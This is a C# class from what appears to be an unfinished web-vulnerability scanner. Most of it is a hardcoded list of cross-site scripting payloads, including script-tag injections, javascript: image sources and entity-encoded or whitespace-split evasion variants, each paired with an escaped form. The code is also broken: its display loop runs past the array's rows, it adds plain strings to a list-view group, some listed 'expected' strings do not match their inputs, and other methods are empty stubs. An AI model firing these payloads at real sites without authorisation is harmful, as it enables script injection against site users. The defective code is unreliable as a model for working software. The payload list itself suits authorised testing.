using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Text;

namespace WindowsApplication1
{
    class XSSPayloadGenerator:PayloadGenerator
    {
        string m_strConnStr;
        System.Data.SQLite.SQLiteConnection m_sqlConn;
        System.Data.SQLite.SQLiteCommand m_sqlCmd;
        String[,] payloads = null;
        
        public XSSPayloadGenerator()
        {
            // TODO: Database connectivity
            /*
            m_strConnStr = "Data Source=payloads.s3db;Version=3;";
            m_sqlConn = new System.Data.SQLite.SQLiteConnection(m_strConnStr);
            m_sqlConn.Open();
            m_sqlCmd = m_sqlConn.CreateCommand();
            m_sqlCmd.CommandText = "select teststring from payloads where category=\'XSS\'";
            */
            payloads = new String[,] {
{"&gt;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&",">\"><script>alert(\"XSS\")</script>&"},
{"&quot;&gt;&lt;STYLE&gt;@import&quot;javascript:alert('XSS')&quot;;&lt;/STYLE&gt;","\"><STYLE>@import\"javascript:alert('XSS')\";</STYLE>"},
{"&gt;&quot;'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;",">\"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;"},
{" alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;"," alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>"},
{"&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;",">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>"},
{"'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'","'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'"},
{"&quot;&gt;","\">"},
{"&gt;&quot;",">\""},
{"'';!--&quot;&lt;XSS&gt;=&amp;{()}","'';!--\"<XSS>=&{()}"},
{"&lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt;","<IMG SRC=\"javascript:alert('XSS');\">"},
{"&lt;IMG SRC=javascript:alert('XSS')&gt;","<IMG SRC=javascript:alert('XSS')>"},
{"&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt; ","<IMG SRC=JaVaScRiPt:alert('XSS')> "},
{"&lt;IMG SRC=JaVaScRiPt:alert(&quot;XSS&lt;WBR&gt;&quot;)&gt;","<IMG SRC=JaVaScRiPt:alert(\"XSS<WBR>\")>"},
{"&lt;IMGSRC=&#106;&#97;&#118;&#97;&amp;&lt;WBR&gt;#115;&#99;&#114;&#105;&#112;&&lt;WBR&gt;#116;&#58;&#97;","<IMGSRC=java&<WBR>#115;crip&<WBR>#116;:a"},
{" &#108;&#101;&&lt;WBR&gt;#114;&#116;&#40;&#39;&#88;&#83&lt;WBR&gt;;&#83;&#39;&#41&gt;"," le&<WBR>#114;t('X&#83<WBR>;S'&#41>"},
{"&lt;IMGSRC=&#0000106&#0000097&&lt;WBR&gt;#0000118&#0000097&#0000115&&lt;WBR&gt;#0000099&#0000114&#0000105&&lt;WBR&gt;#0000112&#0000116&#0000058","<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058"},
{" &&lt;WBR&gt;#0000097;&#0000108;&#0000101;&amp;&lt;WBR&gt;&#0000114;&#0000116;&#0000040;&amp;&lt;WBR&gt;&#0000039;&#0000088;&#0000083;&amp;&lt;WBR&gt;&#0000083;&#0000039;&#0000041;&gt;"," &<WBR>#0000097;&#0000108;&#0000101;&<WBR>&#0000114;&#0000116;&#0000040;&<WBR>&#0000039;&#0000088;&#0000083;&<WBR>&#0000083;&#0000039;&#0000041;>"},
{"&lt;IMGSRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&amp;&lt;WBR&gt;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&amp;&lt;WBR&gt;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;","<IMGSRC=javas&<WBR>cript:&<WBR>alert("},
{" &amp;&lt;WBR&gt;#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&gt;"," &<WBR>#x27;XSS')>"},
{"&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;","<IMG SRC=\"javacript:alert(<WBR>'XSS');\">"},
{"&lt;IMG SRC=&quot;jav&#x0A;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;","<IMG SRC=\"javascript:alert(<WBR>'XSS');\">"},
{"&lt;IMG SRC=&quot;jav&#x0D;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;","<IMG SRC=\"javascript:alert(<WBR>'XSS');\">"},
{"ajajajaa';alert(1);//","ajajajaa';alert(1);//"}
            };
        }
        ~XSSPayloadGenerator()
        {
            //m_sqlConn.Close();
        }
        public void Initialize()
        {

        }
        public override string StrNextPayload()
        {
            return null;
        }
        public override string[] StrExpectedOutput(int payloadid)
        {
            return null;
        }
        public System.Windows.Forms.ListViewGroup getXSSListViewGroup()
        {
            int i = 0;
            System.Windows.Forms.ListViewGroup lviewg = new System.Windows.Forms.ListViewGroup();
            while (i < payloads.Length) {
                lviewg.Items.Add(payloads[i,0]);
                i++;
            }
            return lviewg;
        }

    }
}
